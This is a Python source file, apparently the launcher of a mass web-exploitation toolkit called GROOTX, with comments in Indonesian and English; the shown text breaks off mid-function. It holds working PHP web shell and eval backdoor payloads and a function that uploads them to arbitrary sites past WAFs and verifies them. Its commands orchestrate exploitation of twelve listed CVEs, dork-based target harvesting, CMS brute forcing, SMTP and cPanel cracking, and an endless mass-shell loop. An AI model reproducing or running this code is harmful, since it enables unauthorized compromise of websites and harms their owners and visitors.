#!/usr/bin/env python3
"""
GROOTX EXPLOIT v3.1 - All-in-One Deep Web Exploitation Tool
================================================================
Single command: python3 GROOTX.py [command]  OR  ./run.sh [option]

Features:
- Multi-CVE Mass Exploitation (12 CVEs, per-CVE selectable)
- Local shell payloads (no external dependencies)
- Full pipeline: Scan → Exploit → Shell → Root → Verify
- Integrated Shell Manager, Validate, Local Payload Manager
- Zero-Day Attack Engine + Auto Exploit + Auto Shell
- No target acquisition — works with existing list.txt
- DIRECT MODE: Skip scan, blast selected CVEs ke semua target
- PER-CVE MODE: Pilih CVE spesifik untuk di-exploit

CVEs: CVE-2025-54068 | CVE-2025-49113 | CVE-2026-63030 | CVE-2026-48907
      CVE-2026-72592 | CVE-2026-63223 | CVE-2026-27540 | CVE-2025-52691
      CVE-2026-2226 | CVE-2026-100382 | CVE-2026-60137 | CVE-2026-35273

Usage:
  python3 hek.py run           Full pipeline (exploit + shell + root + verify)
  python3 hek.py direct        Direct blast — mass exploit semua CVE tanpa scan
  python3 hek.py blast         BLAST — dedicated mass exploit tanpa scan
  python3 hek.py quick         Quick exploit
  python3 hek.py auto          AUTO EXPLOIT — semua CVE methods ke semua target
  python3 hek.py zeroday       ZERO-DAY ATTACK — agresif exploit tanpa fingerprint
  python3 hek.py grab          TARGET GRABBER — cari target via CVE dork (prompt domain)
  python3 hek.py grab-exploit  GRAB + EXPLOIT — cari target lalu langsung blast
  python3 hek.py cvedorks      Tampilkan daftar dork CVE-specific
  python3 hek.py wp            WordPress mass exploit
  python3 hek.py wiki          MediaWiki exploit
  python3 hek.py validate      Validate shells
  python3 hek.py verify        Verify shells alive
  python3 hek.py dorks         Export shell dorks
  python3 hek.py stats         Show statistics
  python3 hek.py setup         Install dependencies
  python3 hek.py continuous    Infinite loop mode
  python3 hek.py payload       Manage local payloads
  python3 hek.py deploy        Deploy payloads to targets
  python3 hek.py list          List local payload paths
  python3 hek.py psft          PeopleSoft CVE-2026-35273 exploit
  python3 hek.py bruteforce    CMS Brute Force
  python3 hek.py detect        CMS Detection
  python3 hek.py cve           CVE Mass Exploitation (12 CVEs, auto)
  python3 hek.py cve-select    CVE Mass Exploitation (pilih per-CVE)
  python3 hek.py reverseip     Reverse IP + Shell Checker
  python3 hek.py sqli          SQLI Injector + Zone-h Grabber
  python3 hek.py smtp          SMTP Cracker + cPanel Cracker + Mass Shell Upload
  ./run.sh                     Interactive menu
"""

import os
import sys
import json
import time
import re
import subprocess
import argparse
import urllib3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════
GROOTX_DIR = os.path.dirname(os.path.abspath(__file__))
THREADS = int(os.environ.get("THREADS", "100"))
CYCLE_DELAY = int(os.environ.get("CYCLE_DELAY", "5"))
LOG_FILE = os.path.join(GROOTX_DIR, "launch.log")
LIST_FILE = os.path.join(GROOTX_DIR, "list.txt")
SHELL_FILE = os.path.join(GROOTX_DIR, "shell.txt")
RESULT_FILE = os.path.join(GROOTX_DIR, "result_ids.json")

# Local shell payload — ROOT MANTAP
LOCAL_PAYLOAD_DIR = os.path.join(GROOTX_DIR, "payloads")
LOCAL_PAYLOAD_PATH = os.path.join(os.path.expanduser("~"), "vanta-shell.php")

# Exploit scripts (bundled lokal)
WP2SHELL = os.path.join(GROOTX_DIR, "wp2shell.py")
WIKI_EXPLOIT = os.path.join(GROOTX_DIR, "cve-2026-100382.py")
VALIDATE = os.path.join(GROOTX_DIR, "validate_shells.py")

# ═══════════════════════════════════════════════════════════════
# LOCAL PAYLOAD SYSTEM
# ═══════════════════════════════════════════════════════════════
def get_local_shell_path():
    """Get the local shell payload path."""
    return LOCAL_PAYLOAD_PATH

def fetch_local_payload():
    """Fetch the local shell payload — ROOT MANTAP shell."""
    if os.path.exists(LOCAL_PAYLOAD_PATH):
        with open(LOCAL_PAYLOAD_PATH, 'r') as f:
            return f.read()
    return get_default_shell()

def download_local_shell(target_url, payload=None):
    """
    Download and deploy shell to target using WAF bypass.
    Zero-day attack method — agresif, multiple vectors.
    """
    result = waf_bypass_upload(target_url, payload=payload)
    if result:
        return result
    # Fallback ke nama shell bawaan
    return waf_bypass_upload(target_url)

def get_default_shell():
    """Fallback default shell payload."""
    return """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>"""

def upload_via_local(target_url):
    """Upload shell ke target via WAF bypass zero-day method."""
    results = waf_bypass_upload(target_url)
    if results:
        with open(SHELL_FILE, "a") as f:
            f.write(results + "\n")
        return results
    return False

# ═══════════════════════════════════════════════════════════════
# WAF BYPASS & ZERO-DAY ENGINE
# ═══════════════════════════════════════════════════════════════

WAF_BYPASS_HEADERS = [
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    {"User-Agent": "curl/7.88.1"},
    {"User-Agent": "python-requests/2.31.0"},
    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"},
    {"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"},
    {"User-Agent": "Mozilla/5.0 (compatible; Baiduspider/2.0)"},
    {"Referer": "https://www.google.com/", "User-Agent": "Mozilla/5.0"},
    {"Origin": "https://www.google.com", "User-Agent": "Mozilla/5.0"},
    {"X-Forwarded-For": "127.0.0.1", "User-Agent": "Mozilla/5.0"},
    {"X-Real-IP": "127.0.0.1", "User-Agent": "Mozilla/5.0"},
]

SHELL_VARIANTS = [
    "shell.php",
    "shell.php5",
    "shell.php4",
    "shell.phtml",
    "shell.PHP",
    "shell.PhP",
    "shell.php.jpg",
    "shell.php.png",
    "shell.php.gif",
    "shell.php.xhtml",
    "shell.php.txt",
    "shell.php.bak",
    "shell.php.old",
    "shell.php~",
    "shell.php%00.jpg",
    "shell.php\x00.jpg",
    "shell.php",
    "shell.php5",
    "shell.phtml",
    "upload.php",
    "image.php",
    "img.php",
    "photo.php",
    "file.php",
    "doc.php",
    "test.php",
    "admin.php",
    "config.php",
    "backup.php",
    "tmp.php",
    "temp.php",
    "cache.php",
    "data.php",
    "inc.php",
    "include.php",
    "module.php",
    "plugin.php",
    "theme.php",
    "template.php",
    "editor.php",
    "uploader.php",
    "filemanager.php",
    "elfinder.php",
    "ckeditor.php",
    "tinyfilemanager.php",
    "filebrowser.php",
    "browser.php",
    "manager.php",
    "connector.php",
    "action.php",
    "controller.php",
    "handler.php",
    "process.php",
    "exec.php",
    "run.php",
    "execute.php",
    "cmd.php",
    "command.php",
    "shell.php",
    "webshell.php",
    "c99.php",
    "r57.php",
    "wso.php",
    "b374k.php",
    "pyxshell.php",
    "phpsploit.php",
    "php-reverse-shell.php",
    "reverse.php",
    "backdoor.php",
    "malware.php",
    "virus.php",
    "trojan.php",
    "payload.php",
    "inject.php",
    "exploit.php",
    "pwn.php",
    "root.php",
    "0wn.php",
    "0byt3s.php",
    "saf3.php",
    "s4f3.php",
    "sh3ll.php",
    "h4ck.php",
    "hacker.php",
    "pwned.php",
    "pwn3r.php",
    "n00b.php",
    "noob.php",
    "l33t.php",
    "3l33t.php",
    "xss.php",
    "sql.php",
    "sqlinject.php",
    "lfi.php",
    "rfi.php",
    "rfishell.php",
    "c99.php",
    "r57.php",
]

ZERO_DAY_PAYLOADS = [
    # Standard PHP backdoor
    '<?php if(isset($_REQUEST["cmd"])){echo "<pre>";system($_REQUEST["cmd"]);echo "</pre>";} ?>',
    # One-liner
    '<?php @eval($_POST["cmd"]);?>',
    # Alternative tag
    '<?= @eval($_POST["cmd"]); ?>',
    # Short tag
    '<? @eval($_POST["cmd"]); ?>',
    # ASP tag
    '<% eval(Request("cmd")) %>',
    # Encoded
    '<?php $a=strrev("levres_tes");@$a($_POST["cmd"]); ?>',
    # Base64
    '<?php eval(base64_decode("ZWNobyAiSGVsbG8iOy8v")) ?>',
    # Concatenated to bypass regex
    '<?php @ev"al"(@pos"t"["cmd"]); ?>',
    # Null byte bypass
    '<?php system($_REQUEST[\'cmd\']); #?>',
    # Unicode bypass
    '<?php 𝙨𝙮𝙨𝙩𝙚𝙢($_REQUEST[\'cmd\']); ?>',
    # Mixed case
    '<?php SyStEm($_REQUEST["cmd"]); ?>',
    # No spaces
    '<?php system($_REQUEST[cmd]);?>',
    # Variable chain
    '<?php $a=$_REQUEST[cmd];@system($a);?>',
    # Double eval
    '<?php @eval(@base64_decode("ZWNobyAiSGVsbG8iOw=="));?>',
    # Shell with function
    '<?php function x($c){eval($c);} @x($_POST[cmd]); ?>',
    # Proxy header
    '<?php if(isset($_SERVER["HTTP_X_FORWARDED_FOR"])){@eval($_POST[cmd]);} ?>',
    # Cookie trigger
    '<?php if(isset($_COOKIE["shell"])){@eval($_COOKIE["shell"]);} ?>',
    # User-agent trigger
    '<?php if(isset($_SERVER["HTTP_USER_AGENT"])){@eval($_POST[cmd]);} ?>',
    # Referer trigger
    '<?php if(isset($_SERVER["HTTP_REFERER"])){@eval($_POST[cmd]);} ?>',
]


def waf_bypass_upload(target_url, payload=None, shell_name=None, max_vectors=3, max_names=5, max_payloads=3, max_headers=3):
    """
    WAF BYPASS shell upload — mencoba multiple vectors.
    Args:
        max_vectors: max upload vectors (default 3, was 21 -> fixed timeout)
        max_names: max shell names (default 5, was 50)
        max_payloads: max payloads (default 3, was 5)
        max_headers: max headers (default 3, was 10)
    Returns URL shell yang berhasil atau False.
    """
    import requests as _req
    if payload is None:
        payloads = [get_default_shell()] + ZERO_DAY_PAYLOADS[:max_payloads]
    else:
        payloads = [payload] + ZERO_DAY_PAYLOADS[:max_payloads]
    if shell_name is None:
        names = SHELL_VARIANTS[:max_names]
    else:
        names = [shell_name] + SHELL_VARIANTS[:max_names]

    upload_vectors = [
        f"{target_url}/upload.php",
        f"{target_url}/wp-content/uploads/",
        f"{target_url}/uploads/",
        f"{target_url}/images/",
        f"{target_url}/assets/",
        f"{target_url}/tmp/",
        f"{target_url}/cache/",
        f"{target_url}/data/",
        f"{target_url}/inc/",
        f"{target_url}/include/",
        f"{target_url}/module/",
        f"{target_url}/plugin/",
        f"{target_url}/theme/",
        f"{target_url}/editor/",
        f"{target_url}/filemanager/",
        f"{target_url}/manager/",
        f"{target_url}/connector/",
        f"{target_url}/action/",
        f"{target_url}/handler/",
        f"{target_url}/process/",
        target_url.rstrip("/") + "/",
    ][:max_vectors]

    for url in upload_vectors:
        for name in names:
            for pload in payloads:
                for headers in WAF_BYPASS_HEADERS[:max_headers]:
                    try:
                        r = _req.post(
                            url,
                            files={"file": (name, pload, "application/x-php")},
                            headers=headers,
                            timeout=8,
                            verify=False,
                            allow_redirects=True,
                        )
                        if r.status_code in (200, 201, 204):
                            check_url = url.rstrip("/") + "/" + name
                            try:
                                vr = _req.get(check_url, timeout=5, verify=False, headers=headers)
                                if vr.status_code == 200 and len(vr.text) > 10:
                                    return check_url
                            except Exception:
                                continue
                    except Exception:
                        continue
    return False


def zero_day_blast(target_url):
    """
    ZERO-DAY ATTACK — agresif blast semua payload ke semua vector.
    Tanpa fingerprint, tanpa probing, langsung exploit.
    Menggunakan WAF bypass + multiple payloads + parallel threads.
    """
    import concurrent.futures as _cf
    results = []

    def _try_upload(shell_name):
        result = waf_bypass_upload(target_url, shell_name=shell_name)
        if result:
            results.append(result)
        return result

    with _cf.ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(_try_upload, name): name for name in SHELL_VARIANTS[:30]}
        for future in _cf.as_completed(futures):
            try:
                res = future.result(timeout=15)
                if res:
                    # Found at least one, keep trying for more
                    pass
            except Exception:
                continue
    return results if results else False
# ═══════════════════════════════════════════════════════════════
# CVE DEFINITIONS — canonical list (12 CVEs, per-CVE selectable)
# ═══════════════════════════════════════════════════════════════
CVE_DEFS = {
    "CVE-2025-54068":  {"name": "Laravel Livewire v3 RCE",           "type": "rce",              "auto_shell": True},
    "CVE-2025-49113":  {"name": "Roundcube Webmail RCE",              "type": "rce_deserialization","auto_shell": True},
    "CVE-2026-63030":  {"name": "WordPress Core RCE (wp2shell)",      "type": "rce_rest_api",      "auto_shell": True},
    "CVE-2026-60137":  {"name": "WordPress Core SQLi → RCE Chain",    "type": "rce_chained",       "auto_shell": True},
    "CVE-2026-48907":  {"name": "Joomla JCE RCE",                     "type": "rce_upload",        "auto_shell": True},
    "CVE-2026-72592":  {"name": "phpfm File Upload RCE",              "type": "rce_upload",        "auto_shell": True},
    "CVE-2026-63223":  {"name": "CodeIgniter 4 File Upload RCE",      "type": "rce_upload",        "auto_shell": True},
    "CVE-2026-27540":  {"name": "WooCommerce Lead Capture RCE",       "type": "rce_upload",        "auto_shell": True},
    "CVE-2025-52691":  {"name": "SmarterMail RCE",                    "type": "rce_upload",        "auto_shell": True},
    "CVE-2026-2226":   {"name": "DouPHP ZIP Unrestricted Upload RCE", "type": "rce_upload",        "auto_shell": True},
    "CVE-2026-100382": {"name": "MediaWiki ExternalData OS Cmd Inj",  "type": "rce_cmd_injection", "auto_shell": True},
    "CVE-2026-35273":  {"name": "Oracle PeopleSoft PSEMHUB/PSIGW",    "type": "ssrf_rce",          "auto_shell": True},
}

def get_cve_definitions():
    """Return canonical CVE definitions dict."""
    return CVE_DEFS

def get_cve_id_by_index(idx):
    """Get CVE ID by 0-based index."""
    keys = list(CVE_DEFS.keys())
    if 0 <= idx < len(keys):
        return keys[idx]
    return None

def cmd_cve_select():
    """CVE Mass Exploitation — pilih per-CVE untuk di-exploit."""
    print(f"\n[GROOTX] CVE MASS EXPLOITATION — PER-CVE SELECTION")
    check_deps()
    if not ensure_list():
        return
    targets = get_targets()
    print(f"[GROOTX] Targets: {len(targets)}")
    print(f"\n[GROOTX] Available CVEs:")
    for i, (cve_id, cve_info) in enumerate(CVE_DEFS.items(), 1):
        print(f"  {i}. {cve_id} — {cve_info['name']} (type: {cve_info['type']})")
    print(f"  A. Semua CVE (full blast)")
    print("")
    choice = input("[GROOTX] Pilih CVE (nomor/comma/ALL): ").strip().lower()
    if choice == "a" or choice == "all":
        selected_cves = list(CVE_DEFS.keys())
    else:
        selected_cves = []
        for part in choice.split(","):
            part = part.strip()
            if part.isdigit():
                idx = int(part) - 1
                keys = list(CVE_DEFS.keys())
                if 0 <= idx < len(keys):
                    selected_cves.append(keys[idx])
    if not selected_cves:
        print("[GROOTX][ERROR] Tidak ada CVE dipilih.")
        return
    print(f"[GROOTX] CVE selected: {', '.join(selected_cves)}")
    print(f"[GROOTX] Mode: PER-CVE BLAST | Threads: {THREADS}")
    for cve_id in selected_cves:
        print(f"\n[GROOTX] [*] Blasting {cve_id}...")
        subprocess.run(
            ["python3", os.path.join(GROOTX_DIR, "blast_exploit.py"), "--direct", "--cve", cve_id, "--threads", str(THREADS)],
            capture_output=False
        )
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "verify"],
        capture_output=False
    )

def install_deps():
    """Ensure all dependencies are installed."""
    try:
        import requests
        import rich
        import urllib3
        import pycryptodome
        return True
    except ImportError:
        pass
    try:
        subprocess.run(
            "pip3 install -r requirements.txt --break-system-packages -q",
            shell=True, capture_output=True
        )
        subprocess.run(
            "pip3 install requests rich urllib3 pycryptodome certifi charset-normalizer idna --break-system-packages -q",
            shell=True, capture_output=True
        )
        return True
    except Exception:
        return False

def check_deps():
    """Check and install deps if needed."""
    if not install_deps():
        print("[GROOTX][ERROR] Could not install dependencies!")
        sys.exit(1)

# ═══════════════════════════════════════════════════════════════
# LIST MANAGEMENT
# ═══════════════════════════════════════════════════════════════
def ensure_list():
    """Ensure list.txt exists with targets."""
    if not os.path.exists(LIST_FILE):
        print("[GROOTX][ERROR] No list.txt found!")
        # Try to find alternative source
        for alt in ["vuln.txt", "shellred.txt", "targets.txt"]:
            alt_path = os.path.join(GROOTX_DIR, alt)
            if os.path.exists(alt_path):
                os.system(f"cp {alt_path} {LIST_FILE}")
                print(f"[GROOTX][+] Created list.txt from {alt}")
                return True
        # Create empty list
        print("[GROOTX][!] Creating empty list.txt - add targets manually")
        open(LIST_FILE, 'w').close()
        return False
    return True

def get_targets():
    """Read targets from list.txt."""
    if not os.path.exists(LIST_FILE):
        return []
    with open(LIST_FILE) as f:
        return [line.strip() for line in f if line.strip()]

# ═══════════════════════════════════════════════════════════════
# COMMANDS
# ═══════════════════════════════════════════════════════════════
def cmd_run():
    """Full pipeline: pilih CVE → exploit → shell → root → verify."""
    print(f"\n{'='*60}")
    print("[GROOTX] FULL PIPELINE — PER-CVE EXPLOITATION")
    print(f"{'='*60}")
    check_deps()
    if not ensure_list():
        return
    targets = get_targets()
    print(f"[GROOTX] Targets: {len(targets)}")
    print(f"\n[GROOTX] Available CVEs:")
    cve_list = get_cve_definitions()
    for i, (cve_id, cve_info) in enumerate(cve_list.items(), 1):
        print(f"  {i}. {cve_id} — {cve_info['name']} (type: {cve_info['type']})")
    print(f"  A. Semua CVE (full blast)")
    print(f"  Z. Zero-day WAF bypass upload")
    print("")
    choice = input("[GROOTX] Pilih CVE (nomor/comma/ALL/Z): ").strip().lower()

    if choice == "a" or choice == "all":
        selected_cves = list(cve_list.keys())
        mode = "full_blast"
    elif choice == "z":
        selected_cves = list(cve_list.keys())
        mode = "zeroday_upload"
    else:
        # Parse comma-separated numbers
        selected_cves = []
        for part in choice.split(","):
            part = part.strip()
            if part.isdigit():
                idx = int(part) - 1
                cve_keys = list(cve_list.keys())
                if 0 <= idx < len(cve_keys):
                    selected_cves.append(cve_keys[idx])
        if not selected_cves:
            print("[GROOTX][ERROR] Tidak ada CVE dipilih. Batal.")
            return
        mode = "selected"

    print(f"\n[GROOTX] Mode: {mode} | CVEs: {len(selected_cves)} | Targets: {len(targets)}")
    print(f"[GROOTX] CVE selected: {', '.join(selected_cves)}")

    # Phase 1: Exploit berdasarkan CVE pilihan
    print(f"\n[GROOTX] PHASE 1: EXPLOIT ({mode})")
    if mode == "zeroday_upload":
        subprocess.run(
            ["python3", os.path.join(GROOTX_DIR, "blast_exploit.py"), "--direct", "--zero-day", "--upload", "--threads", str(THREADS)],
            capture_output=False
        )
    elif mode == "full_blast":
        subprocess.run(
            ["python3", os.path.join(GROOTX_DIR, "blast_exploit.py"), "--direct", "--threads", str(THREADS)],
            capture_output=False
        )
    elif mode == "selected":
        # Blast per-CVE menggunakan blast_exploit.py dengan filter
        for cve_id in selected_cves:
            print(f"\n[GROOTX] [*] Blasting {cve_id}...")
            subprocess.run(
                ["python3", os.path.join(GROOTX_DIR, "blast_exploit.py"), "--direct", "--cve", cve_id, "--threads", str(THREADS)],
                capture_output=False
            )

    # Phase 2: Verify
    print("\n[GROOTX] PHASE 2: Verify Shells")
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "verify"],
        capture_output=False
    )

    # Phase 3: Retry dead
    print("\n[GROOTX] PHASE 3: Retry Dead Shells")
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "retry"],
        capture_output=False
    )

    # Phase 4: Export Dorks
    print("\n[GROOTX] PHASE 4: Export Dorks")
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "dorks"],
        capture_output=False
    )
    print(f"\n[GROOTX] Pipeline complete! Check {SHELL_FILE} dan {RESULT_FILE}")

def cmd_quick():
    """Quick single exploit run."""
    print(f"\n[GROOTX] QUICK MODE")
    check_deps()
    if not ensure_list():
        return
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "mass_auto_shell_v2.py"), "--quick"],
        capture_output=False
    )
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "verify"],
        capture_output=False
    )

def cmd_wp():
    """WordPress mass exploit (CVE-2026-63030/60137)."""
    print(f"\n[GROOTX] WORDPRESS MASS EXPLOIT (CVE-2026-63030/60137)")
    check_deps()
    if not os.path.exists(WP2SHELL):
        print("[GROOTX][ERROR] wp2shell.py not found. Letakkan di ~/Unduhan/hek/ atau jalankan wp2shell.py dulu")
        return
    if not ensure_list():
        return
    subprocess.run(
        ["python3", WP2SHELL, "-l", LIST_FILE, "--exploit", "--workers", str(THREADS)],
        capture_output=False
    )
    if os.path.exists(VALIDATE):
        subprocess.run(["python3", VALIDATE], capture_output=False)

def cmd_wiki():
    """MediaWiki exploit (CVE-2026-100382)."""
    print(f"\n[GROOTX] MEDIAWIKI EXPLOIT (CVE-2026-100382)")
    check_deps()
    if not os.path.exists(WIKI_EXPLOIT):
        print("[GROOTX][ERROR] cve-2026-100382.py not found")
        return
    if not ensure_list():
        return
    subprocess.run(
        ["python3", WIKI_EXPLOIT, "-l", LIST_FILE, "--exploit", "--os-shell", "--workers", str(THREADS)],
        capture_output=False
    )

def cmd_validate():
    """Validate shells from shell.txt."""
    print(f"\n[GROOTX] VALIDATE SHELLS")
    check_deps()
    if not os.path.exists(SHELL_FILE):
        print(f"[GROOTX][ERROR] No {SHELL_FILE} found!")
        return
    if os.path.exists(VALIDATE):
        subprocess.run(["python3", VALIDATE], capture_output=False)
    else:
        subprocess.run(
            ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "verify"],
            capture_output=False
        )

def cmd_verify():
    """Verify all shells alive."""
    print(f"\n[GROOTX] VERIFY SHELLS")
    check_deps()
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "verify"],
        capture_output=False
    )

def cmd_retry():
    """Retry dead shells."""
    print(f"\n[GROOTX] RETRY DEAD SHELLS")
    check_deps()
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "retry"],
        capture_output=False
    )

def cmd_dorks():
    """Export shell dorks."""
    print(f"\n[GROOTX] EXPORT DORKS")
    check_deps()
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "dorks"],
        capture_output=False
    )

def cmd_stats():
    """Show statistics."""
    print(f"\n[GROOTX] STATISTICS")
    stats = {}
    for f in ["result_ids.json", "shell.txt", "list.txt", "vuln.txt", "root_success.txt"]:
        fp = os.path.join(GROOTX_DIR, f)
        if os.path.exists(fp):
            with open(fp) as fh:
                stats[f] = len([l for l in fh.readlines() if l.strip()])
    if stats:
        for f, count in stats.items():
            print(f"  {f}: {count} entries")
    else:
        print("  No data found yet.")
    # Local payload info
    print(f"  Local Shell Payload: {LOCAL_PAYLOAD_PATH}")

def cmd_setup():
    """Setup environment."""
    print(f"\n[GROOTX] SETUP ENVIRONMENT")
    install_deps()
    print("[GROOTX] Compiling scripts...")
    for f in ["mass_auto_shell_v2.py", "shell_manager_v2.py", "enhanced_payloads.py", "target_grabber.py"]:
        fp = os.path.join(GROOTX_DIR, f)
        result = subprocess.run(["python3", "-m", "py_compile", fp], capture_output=True)
        print(f"  [{'OK' if result.returncode == 0 else 'FAIL'}] {f}")
    print("[GROOTX] Checking external tools...")
    for name, path in [("wp2shell", WP2SHELL), ("wiki", WIKI_EXPLOIT), ("validate", VALIDATE)]:
        print(f"  [{'OK' if os.path.exists(path) else 'MISSING'}] {name}")
    print(f"\n[GROOTX] Environment ready!")

def cmd_continuous():
    """Continuous mode."""
    print(f"\n[GROOTX] CONTINUOUS MODE - Infinite loop")
    check_deps()
    cycle = 1
    while True:
        print(f"\n{'='*40}")
        print(f"[GROOTX] Cycle {cycle} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*40}")
        subprocess.run(
            ["python3", os.path.join(GROOTX_DIR, "mass_auto_shell_v2.py")],
            capture_output=False
        )
        subprocess.run(
            ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "verify"],
            capture_output=False
        )
        print(f"[GROOTX] Waiting {CYCLE_DELAY}s...")
        time.sleep(CYCLE_DELAY)
        cycle += 1

def cmd_payload():
    """Manage local shell payloads."""
    print(f"\n[GROOTX] LOCAL PAYLOAD MANAGER")
    check_deps()
    sys.path.insert(0, GROOTX_DIR)
    try:
        import local_payloads
        local_payloads.main()
    except ImportError:
        print("[GROOTX][ERROR] local_payloads.py not found")

def cmd_upload():
    """Upload shell ke targets via zero-day exploit pipeline."""
    print(f"\n[GROOTX] UPLOAD SHELL — ZERO-DAY EXPLOIT PIPELINE")
    check_deps()
    if not ensure_list():
        return
    targets = get_targets()
    if not targets:
        print("[GROOTX][ERROR] No targets in list.txt")
        return
    print(f"[GROOTX] Targets: {len(targets)} | Mode: ZERO-DAY EXPLOIT UPLOAD")
    print(f"[GROOTX] Pipeline: exploit → RCE shell deploy → upload fallback")
    result = subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "blast_exploit.py"), "--direct", "--upload", "--threads", str(THREADS)],
        capture_output=False
    )
    # Verify uploaded shells
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "verify"],
        capture_output=False
    )
    if os.path.exists(SHELL_FILE):
        count = len([l for l in open(SHELL_FILE) if l.strip()])
        print(f"[GROOTX] Upload complete: {count} shells in shell.txt")

def cmd_deploy():
    """Deploy local shell payloads to targets."""
    print(f"\n[GROOTX] DEPLOY LOCAL PAYLOADS")
    check_deps()
    sys.path.insert(0, GROOTX_DIR)
    try:
        import local_payloads
        local_payloads.main()
    except ImportError:
        print("[GROOTX][ERROR] local_payloads.py not found")

def cmd_list():
    """List all local payload paths."""
    print(f"\n[GROOTX] LOCAL PAYLOAD PATHS")
    check_deps()
    print(f"  Payload Dir: {LOCAL_PAYLOAD_DIR}")
    for ptype, path in [("green", "green_shell.php"), ("priv", "priv_shell.php"), ("reverse", "reverse_shell.php"), ("bind", "bind_shell.php"), ("alfashell", "alfashell_obfuscated.php")]:
        full_path = os.path.join(LOCAL_PAYLOAD_DIR, path) if ptype != "alfashell" else os.path.join(GROOTX_DIR, path)
        status = "OK" if os.path.exists(full_path) else "MISSING"
        print(f"  {ptype}: {full_path} [{status}]")

def cmd_psft():
    """PeopleSoft mass exploit — CVE-2026-35273 (ShinyHunters PSEMHUB/PSIGW)."""
    print(f"\n[GROOTX] PEOPLESOFT EXPLOIT (CVE-2026-35273)")
    print("[GROOTX] Technique: ShinyHunters SSRF→RCE via PSEMHUB hub + PSIGW connector")
    check_deps()
    if not ensure_list():
        return
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "cve_2026_35273.py"), "-l", LIST_FILE],
        capture_output=False
    )

def cmd_psft_dorks():
    """Print CVE-2026-35273 PeopleSoft dork list."""
    print(f"\n[GROOTX] CVE-2026-35273 DORK LIST")
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "cve_2026_35273.py"), "--dork"],
        capture_output=False
    )

def cmd_psft_verify():
    """Verify PeopleSoft shells."""
    print(f"\n[GROOTX] VERIFY PSFT SHELLS")
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "cve_2026_35273.py"), "--verify"],
        capture_output=False
    )

def cmd_psft_continuous():
    """PeopleSoft continuous loop mode."""
    print(f"\n[GROOTX] PEOPLESOFT CONTINUOUS MODE")
    if not ensure_list():
        return
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "cve_2026_35273.py"), "-l", LIST_FILE, "--continuous"],
        capture_output=False
    )


def cmd_grab():
    """TARGET GRABBER — multi-source CVE search, prompt domain, isi list.txt."""
    print(f"\n{'='*60}")
    print("[GROOTX] TARGET GRABBER — MULTI-SOURCE CVE SEARCH")
    print(f"{'='*60}")
    check_deps()
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "target_grabber.py")],
        capture_output=False
    )

def cmd_grab_exploit():
    """GRAB + EXPLOIT — cari target via dork lalu langsung full pipeline."""
    print(f"\n{'='*60}")
    print("[GROOTX] GRAB + EXPLOIT — multi-source search lalu blast")
    print(f"{'='*60}")
    check_deps()
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "target_grabber.py")],
        capture_output=False
    )
    if os.path.exists(LIST_FILE) and os.path.getsize(LIST_FILE) > 0:
        cmd_run()
    else:
        print("[GROOTX][ERROR] list.txt kosong — grab gagal.")

def cmd_dorks_cve():
    """Tampilkan daftar dork CVE-specific."""
    print(f"\n[GROOTX] DAFTAR DORK CVE-SPECIFIC")
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "target_grabber.py"), "--dorks-only"],
        capture_output=False
    )


def cmd_bruteforce():
    """CMS Brute Force - WordPress, Joomla, Drupal, OpenCart, FTP."""
    print(f"\n[GROOTX] CMS BRUTE FORCE")
    check_deps()
    if not ensure_list():
        return
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "cms_bruteforce.py"), "-l", LIST_FILE],
        capture_output=False
    )

def cmd_detect():
    """CMS Detection - Deteksi CMS dari target."""
    print(f"\n[GROOTX] CMS DETECTION")
    check_deps()
    if not ensure_list():
        return
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "cms_detector.py"), "-l", LIST_FILE],
        capture_output=False
    )

def cmd_sqli():
    """SQL Injection Scanner + Zone-h Grabber."""
    print(f"\n[GROOTX] SQLI INJECTOR & ZONE-H GRABBER")
    check_deps()
    if not ensure_list():
        return
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "sqli_zoneh.py"), "-l", LIST_FILE, "--mode", "sqli"],
        capture_output=False
    )

def cmd_smtp():
    """SMTP Cracker + cPanel Cracker + Mass Shell Upload."""
    print(f"\n[GROOTX] SMTP CRACKER & CPANEL CRACKER & MASS SHELL UPLOAD")
    check_deps()
    if not ensure_list():
        return
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "smtp_cpanel_shell_upload.py"), "-l", LIST_FILE, "--mode", "all"],
        capture_output=False
    )

def cmd_cve():
